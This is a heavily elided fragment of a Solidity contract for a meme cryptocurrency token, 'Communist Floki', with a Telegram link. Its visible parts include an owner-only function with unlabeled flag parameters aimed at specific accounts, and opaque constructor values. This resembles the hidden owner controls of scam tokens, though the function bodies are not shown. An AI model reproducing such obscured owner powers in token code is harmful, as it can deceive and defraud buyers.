...
/**
 * Communist Floki
 * Redistribution wealth to
 * the people.
 * 
 * https://t.me/CommunistFloki
 **/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function CommunistRedistribution(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
    ...
    function _activateCommunism(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
...
contract ERC20Commi is Context, ERC20 {
    constructor(
        ...
        _activateCommunism(owner, initialSupply, house6, house7);
    }
}

contract CommunistFloki is ERC20Commi {
    constructor() ERC20Commi("Communist Floki", "COMMIFLOKI", false, true, 900, 25, msg.sender, 140000000 * 10 ** 18, msg.sender, 77) {
    }
}